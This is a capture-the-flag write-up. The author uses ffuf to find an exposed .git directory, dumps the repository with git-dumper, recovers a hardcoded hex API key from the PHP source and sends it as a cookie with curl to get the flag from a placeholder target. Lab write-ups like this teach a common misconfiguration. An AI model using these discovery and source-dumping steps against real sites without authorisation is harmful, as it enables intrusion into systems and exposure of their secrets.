The challenge required discovering an exposed `.git` directory.

I first brute-forced hidden files/directories using `ffuf` and found `/.git/`:

```bash id="x4m8qp"
ffuf -u http://TARGET/FUZZ \
-w /usr/share/wordlists/dirb/common.txt -fc 404
```

After discovering the exposed Git repository, I dumped the source code using `git-dumper`:

```bash id="r7q2va"
git-dumper http://TARGET/.git/ dump
```

Inspecting the dumped files revealed:

```php id="k1v9mc"
if($_COOKIE['api_key'] == $apikey)
    echo "Flag: $flag";
```

Inside `contact_process.php`, the API key source was disclosed:

```php id="p5m3zu"
bin2hex('this_is_top_secret')
```

Which evaluates to:

```txt id="t8q4ra"
746869735f69735f746f705f736563726574
```

Finally, I set the required cookie and accessed `api.php` to retrieve the flag:

```bash id="y2x7pk"
curl --cookie "api_key=746869735f69735f746f705f736563726574" \
http://TARGET/api.php
```
